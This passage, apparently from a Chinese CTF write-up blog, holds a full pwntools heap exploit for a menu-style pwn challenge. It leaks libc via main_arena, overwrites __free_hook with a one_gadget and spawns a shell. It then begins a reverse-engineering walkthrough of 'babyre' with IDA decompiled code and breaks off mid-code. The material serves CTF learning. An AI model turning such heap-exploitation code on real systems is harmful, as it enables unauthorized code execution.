class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># io = remote(&quot;154.64.254.169&quot;,33215)</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">name,rating,score,descSize,desc</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;&gt;&gt;&quot;</span>,<span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s name:&quot;</span>,name)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class=\"built_in\">str</span>(rating))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s score:&quot;</span>,<span class=\"built_in\">str</span>(score))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class=\"built_in\">str</span>(descSize))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s descript:&quot;</span>,desc)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;&gt;&gt;&quot;</span>,<span class=\"string\">b&quot;2&quot;</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,descSize,desc</span>):</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;&gt;&gt;&quot;</span>,<span class=\"string\">b&quot;3&quot;</span>)</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input index you want to delete(index from 0) :&quot;</span>,<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;plz input max size you want to change to:&quot;</span>,<span class=\"built_in\">str</span>(descSize))</span><br><span class=\"line\">\tio.sendafter(<span class=\"string\">b&quot;plz input description:&quot;</span>,desc)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>():</span><br><span class=\"line\">\tio.sendlineafter(<span class=\"string\">b&quot;&gt;&gt;&quot;</span>,<span class=\"string\">b&quot;4&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;plz enter your username:&quot;</span>)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b&quot;g01den&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&quot;testify&quot;</span>,<span class=\"number\">12</span>,<span class=\"number\">10002221</span>,<span class=\"number\">128</span>,<span class=\"string\">b&quot;hardhard&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&quot;bbbb&quot;</span>,<span class=\"number\">12</span>,<span class=\"number\">10002221</span>,<span class=\"number\">128</span>,<span class=\"string\">b&quot;what&quot;</span>)</span><br><span class=\"line\">add(<span class=\"string\">b&quot;cccc&quot;</span>,<span class=\"number\">12</span>,<span class=\"number\">10002221</span>,<span class=\"number\">128</span>,<span class=\"string\">b&quot;nani&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(<span class=\"string\">&quot;######################leaking libc address########################3&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;&gt;&gt;&quot;</span>,<span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s name:&quot;</span>,<span class=\"string\">b&quot;dddd&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">12</span>))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s score:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">10002221</span>))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">128</span>))</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class=\"string\">b&quot;dddddddd&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;dddddddd&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># main_arena = u64(io.recvuntil(b&quot;\\x7f&quot;)[:-6].ljust(8,b&quot;\\x00&quot;))</span></span><br><span class=\"line\"><span class=\"comment\"># main_arena = u64(io.recvuntil(b&quot;\\x7f&quot;).ljust(8,b&quot;\\x00&quot;))</span></span><br><span class=\"line\">main_arena = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;main_arena =&gt; &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(main_arena)))</span><br><span class=\"line\"></span><br><span class=\"line\">libc_base = main_arena - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">log.success(<span class=\"string\">&quot;libc_base =&gt; &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(libc_base)))</span><br><span class=\"line\"></span><br><span class=\"line\">gdb.attach(io)</span><br><span class=\"line\">pause()</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"string\">b&quot;eeee&quot;</span>,<span class=\"number\">12</span>,<span class=\"number\">10002221</span>,<span class=\"number\">128</span>,<span class=\"string\">b&quot;eeeeeeee&quot;</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">log.info(<span class=\"string\">&quot;######################leaking chunk6 address########################3&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;&gt;&gt;&quot;</span>,<span class=\"string\">b&quot;1&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s name:&quot;</span>,<span class=\"string\">b&quot;ffff&quot;</span>)</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s rating:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">12</span>))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input music&#x27;s score:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">10002221</span>))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b&quot;plz input descript&#x27;s max size:&quot;</span>,<span class=\"built_in\">str</span>(<span class=\"number\">128</span>))</span><br><span class=\"line\">io.sendafter(<span class=\"string\">b&quot;plz input music&#x27;s descript:&quot;</span>,<span class=\"string\">b&quot;ffffffff&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">show()</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;ffffffff&quot;</span>)</span><br><span class=\"line\">chunk = u64(io.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">chunk_basee = chunk - <span class=\"number\">0x210</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(chunk))</span><br><span class=\"line\">log.success(<span class=\"string\">&quot;chunk_basee =&gt; &quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">hex</span>(chunk_basee)))</span><br><span class=\"line\"></span><br><span class=\"line\">free_hook = libc_base + libc.sym[<span class=\"string\">&quot;__free_hook&quot;</span>]</span><br><span class=\"line\">target_chunk = chunk_basee + <span class=\"number\">0x210</span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span> * <span class=\"number\">0x80</span> + p64(<span class=\"number\">0x90</span>) + p64(<span class=\"number\">0x51</span>) + <span class=\"string\">b&quot;b&quot;</span> * <span class=\"number\">0x30</span> + p64(<span class=\"number\">1</span>) + p64(<span class=\"number\">10002221</span>) + p64(free_hook)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x200</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">one_gadget = libc_base + <span class=\"number\">0x4527a</span></span><br><span class=\"line\">edit(<span class=\"number\">1</span>,<span class=\"number\">0x100</span>,p64(one_gadget))</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p><strong>注：别问为啥没有剩下两个 pwn 题的 wp，因为我也不会，并且短时间内学不会</strong></p>\n<h2 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> Re：</h2>\n<h3 id=\"babyre\"><a class=\"markdownIt-Anchor\" href=\"#babyre\">#</a> babyre：</h3>\n<p>​\t\t无壳。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// positive sp value has been detected, the output may be wrong!</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> __fastcall __noreturn <span class=\"title\">start</span><span class=\"params\">(__int64 a1, __int64 a2, <span class=\"type\">void</span> (*a3)(<span class=\"type\">void</span>))</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v4; <span class=\"comment\">// esi</span></span><br><span class=\"line\">  __int64 v5; <span class=\"comment\">// [rsp-8h] [rbp-8h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">char</span> *retaddr; <span class=\"comment\">// [rsp+0h] [rbp+0h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v4 = v5;</span><br><span class=\"line\">  v5 = v3;</span><br><span class=\"line\">  _libc_start_main(main, v4, &amp;retaddr, <span class=\"number\">0LL</span>, <span class=\"number\">0LL</span>, a3, &amp;v5);</span><br><span class=\"line\">  __halt();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t是 Linux 编译的，进 main 里看看</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">__int64 __fastcall <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> a1, <span class=\"type\">char</span> **a2, <span class=\"type\">char</span> **a3)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v3; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  __int64 v4; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  _BYTE v6[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+0h] [rbp-A0h] BYREF</span></span><br><span class=\"line\">  _BYTE v7[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+20h] [rbp-80h] BYREF</span></span><br><span class=\"line\">  _BYTE v8[<span class=\"number\">32</span>]; <span class=\"comment\">// [rsp+40h] [rbp-60h] BYREF</span></span><br><span class=\"line\">  _BYTE v9[<span class=\"number\">40</span>]; <span class=\"comment\">// [rsp+60h] [rbp-40h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v10; <span class=\"comment\">// [rsp+88h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v10 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  std::string::<span class=\"built_in\">basic_string</span>(v6, a2, a3);</span><br><span class=\"line\">  std::string::<span class=\"built_in\">basic_string</span>(v7, a2, v3);</span><br><span class=\"line\">  std::string::<span class=\"built_in\">basic_string</span>(v8, a2, v4);</span><br><span class=\"line\">  std::<span class=\"keyword\">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;std::cout, &amp;unk_21AD);</span><br><span class=\"line\">  std::<span class=\"keyword\">operator</span>&gt;&gt;&lt;<span class=\"type\">char</span>&gt;(&amp;std::cin, v6);</span><br><span class=\"line\">  <span class=\"built_in\">sub_147E</span>();</span><br><span class=\"line\">  <span class=\"built_in\">sub_1558</span>();</span><br><span class=\"line\">  <span class=\"built_in\">sub_13A9</span>(v8, v6);</span><br><span class=\"line\">  std::string::<span class=\"keyword\">operator</span>=(v7, v6);</span><br><span class=\"line\">  std::string::<span class=\"built_in\">basic_string</span>(v9, v6);</span><br><span class=\"line\">  <span class=\"built_in\">sub_1920</span>(v9, v7);</span><br><span class=\"line\">  std::string::~<span class=\"built_in\">string</span>(v9);</span><br><span class=\"line\">  std::string::<span class=\"built_in\">basic_string</span>(v9, v7);</span><br><span class=\"line\">  <span class=\"built_in\">sub_17A7</span>(v9);</span><br><span class=\"line\">  std::string::~<span class=\"built_in\">string</span>(v9);</span><br><span class=\"line\">  std::string::~<span class=\"built_in\">string</span>(v8);</span><br><span class=\"line\">  std::string::~<span class=\"built_in\">string</span>(v7);</span><br><span class=\"line\">  std::string::~<span class=\"built_in\">string</span>(v6);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0LL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\tC++ 逆向，代码不复杂，Shift+F12 找关键字符串，找到了这个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.rodata:00000000000021BF aWrongValue     db &#x27;Wrong Value&#x27;,0      ; DATA XREF: sub_17A7+110↑o</span><br><span class=\"line\">.rodata:00000000000021CB aCurruntValue   db &#x27;Currunt Value&#x27;,0    ; DATA XREF: sub_17A7+149↑o</span><br></pre></td></tr></table></figure>\n<p>​\t\t跟踪一下，这个函数调用了：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title\">sub_17A7</span><span class=\"params\">(__int64 a1)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v2; <span class=\"comment\">// [rsp+10h] [rbp-1B0h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+14h] [rbp-1ACh]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+18h] [rbp-1A8h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v5; <span class=\"comment\">// [rsp+1Ch] [rbp-1A4h]</span></span><br><span class=\"line\">  _DWORD v6[<span class=\"number\">102</span>]; <span class=\"comment\">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v7; <span class=\"comment\">// [rsp+1B8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v7 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  v5 = std::string::<span class=\"built_in\">length</span>(a1);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v6, <span class=\"number\">0</span>, <span class=\"number\">0x190</span>uLL);</span><br><span class=\"line\">  v2 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt; v5; ++i )</span><br><span class=\"line\">    v6[i] = *(<span class=\"type\">char</span> *)std::string::<span class=\"keyword\">operator</span>[](a1, i) ^ (i / <span class=\"number\">3</span>);</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt; v5; ++j )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6[j] != dword_4020[j] )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v2 = <span class=\"number\">1</span>;</span><br><span class=\"line\">      std::<span class=\"keyword\">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;std::cout, <span class=\"string\">&quot;Wrong Value&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !v2 )</span><br><span class=\"line\">    std::<span class=\"keyword\">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class=\"type\">char</span>&gt;&gt;(&amp;std::cout, <span class=\"string\">&quot;Currunt Value&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v7 - __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这里有个异或运算，逐个比较，推测这里就是目的函数，返回 main 函数，传参是 v9，盯着 v9，从下往上看，找到门路：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">unsigned</span> __int64 __fastcall <span class=\"title\">sub_1920</span><span class=\"params\">(__int64 a1, __int64 a2)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v2; <span class=\"comment\">// rdx</span></span><br><span class=\"line\">  _BYTE *v3; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">int</span> i; <span class=\"comment\">// [rsp+10h] [rbp-A0h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v6; <span class=\"comment\">// [rsp+14h] [rbp-9Ch]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> j; <span class=\"comment\">// [rsp+18h] [rbp-98h]</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v8; <span class=\"comment\">// [rsp+1Ch] [rbp-94h]</span></span><br><span class=\"line\">  _WORD *v9; <span class=\"comment\">// [rsp+20h] [rbp-90h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v10; <span class=\"comment\">// [rsp+28h] [rbp-88h]</span></span><br><span class=\"line\">  _BYTE v11[<span class=\"number\">44</span>]; <span class=\"comment\">// [rsp+30h] [rbp-80h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">int</span> v12; <span class=\"comment\">// [rsp+5Ch] [rbp-54h]</span></span><br><span class=\"line\">  _QWORD v13[<span class=\"number\">6</span>]; <span class=\"comment\">// [rsp+60h] [rbp-50h] BYREF</span></span><br><span class=\"line\">  __int16 v14; <span class=\"comment\">// [rsp+90h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v15; <span class=\"comment\">// [rsp+98h] [rbp-18h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v15 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(v13, <span class=\"number\">0</span>, <span class=\"built_in\">sizeof</span>(v13));</span><br><span class=\"line\">  v14 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">63</span>; ++i )</span><br><span class=\"line\">    *((_BYTE *)v13 + i) = dword_2040[i];</span><br><span class=\"line\">  v10 = std::string::<span class=\"built_in\">size</span>(a1);</span><br><span class=\"line\">  v9 = (_WORD *)std::string::<span class=\"built_in\">data</span>(a1);</span><br><span class=\"line\">  std::string::<span class=\"built_in\">basic_string</span>(v11, a2, v2);</span><br><span class=\"line\">  v12 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( j = <span class=\"number\">0</span>; j &lt; (<span class=\"type\">int</span>)(v10 / <span class=\"number\">3</span>); ++j )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_WORD *)((<span class=\"type\">char</span> *)&amp;v12 + <span class=\"number\">1</span>) = *v9;</span><br><span class=\"line\">    v3 = v9 + <span class=\"number\">1</span>;</span><br><span class=\"line\">    v9 = (_WORD *)((<span class=\"type\">char</span> *)v9 + <span class=\"number\">3</span>);</span><br><span class=\"line\">    <span class=\"built_in\">HIBYTE</span>(v12) = *v3;</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + (<span class=\"built_in\">BYTE1</span>(v12) &gt;&gt; <span class=\"number\">2</span>)));</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(</span><br><span class=\"line\">      v11,</span><br><span class=\"line\">      (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + (((<span class=\"type\">unsigned</span> __int8)(<span class=\"number\">16</span> * <span class=\"built_in\">BYTE1</span>(v12)) | (<span class=\"built_in\">BYTE2</span>(v12) &gt;&gt; <span class=\"number\">4</span>)) &amp; <span class=\"number\">0x3F</span>)));</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(</span><br><span class=\"line\">      v11,</span><br><span class=\"line\">      (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + (((<span class=\"type\">unsigned</span> __int8)(<span class=\"number\">4</span> * <span class=\"built_in\">BYTE2</span>(v12)) | (<span class=\"built_in\">HIBYTE</span>(v12) &gt;&gt; <span class=\"number\">6</span>)) &amp; <span class=\"number\">0x3F</span>)));</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + (<span class=\"built_in\">HIBYTE</span>(v12) &amp; <span class=\"number\">0x3F</span>)));</span><br><span class=\"line\">    v6 += <span class=\"number\">4</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( v6 == <span class=\"number\">76</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      std::string::<span class=\"keyword\">operator</span>+=(v11, <span class=\"string\">&quot;\\r\\n&quot;</span>);</span><br><span class=\"line\">      v6 = <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  v8 = v10 % <span class=\"number\">3</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v8 == <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">BYTE1</span>(v12) = *(_BYTE *)v9;</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + (<span class=\"built_in\">BYTE1</span>(v12) &gt;&gt; <span class=\"number\">2</span>)));</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + ((<span class=\"number\">16</span> * <span class=\"built_in\">BYTE1</span>(v12)) &amp; <span class=\"number\">0x30</span>)));</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, <span class=\"string\">&quot;==&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( v8 == <span class=\"number\">2</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_WORD *)((<span class=\"type\">char</span> *)&amp;v12 + <span class=\"number\">1</span>) = *v9;</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(v11, (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + (<span class=\"built_in\">BYTE1</span>(v12) &gt;&gt; <span class=\"number\">2</span>)));</span><br><span class=\"line\">    std::string::<span class=\"keyword\">operator</span>+=(</span><br><span class=\"line\">      v11,</span><br><span class=\"line\">      (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)*((<span class=\"type\">char</span> *)v13 + ((<span class=\"number\">16</span> * <span class=\"built_in\">BYTE1</span>(v12)) &amp; <span class=\"number\">0x30</span> | (<span class=\"type\">unsigned</span> <span class=\"type\">int</span>)(<span class=\"built_in\">BYTE2</span>(v12) &gt;&gt; <span class=\"number\">4</span>))));</span><br><span 